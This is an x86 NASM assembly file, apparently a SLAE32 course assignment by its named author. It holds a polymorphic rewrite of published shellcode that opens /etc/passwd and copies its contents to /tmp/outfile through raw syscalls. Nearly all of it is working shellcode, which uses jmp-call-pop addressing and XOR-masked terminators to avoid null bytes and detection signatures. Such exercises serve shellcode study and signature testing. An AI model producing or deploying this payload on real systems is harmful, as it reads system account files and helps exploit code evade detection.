; Title: Polymorphized version of cp /etc/passwd /tmp/outfile
; Filename: shellcode3.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-864.php
;
; A more detailed description of this code can be found at
; http://markshaneck.com/SLAE32/slae32-assignment6
;


global _start
section .text

_start:
  xor    ecx,ecx
  mul    ecx
  add    al,0x5
  jmp    get_data

got_data:
  pop    esi
  xor    byte [esi+0xb],0xff
  mov    ebx,esi
  int    0x80

  xchg   ebx,eax
  mov    eax,ecx
  sub    al,0xfd
  not    dx
  sub    esp,edx
  mov    ecx,esp
  int    0x80

  mov    edi,eax
  lea    ebx,[esi+0xc]
  xor    byte [ebx+0xc],0xff
  xor    eax,eax
  add    eax,0x5
  xor    ecx,ecx
  add    cl,0x42
  xor    dx,0xff5b
  int    0x80

  xor    ebx,ebx
  xchg   ebx,eax
  add    eax,0x4
  xchg   edi,edx
  mov    ecx,esp
  int    0x80

  xor    eax,eax
  or     al,0x1
  mov    bl,0x5
  int    0x80

get_data:
  call   got_data
  data: db "/etc/passwd",0xff,"/tmp/outfile",0xff
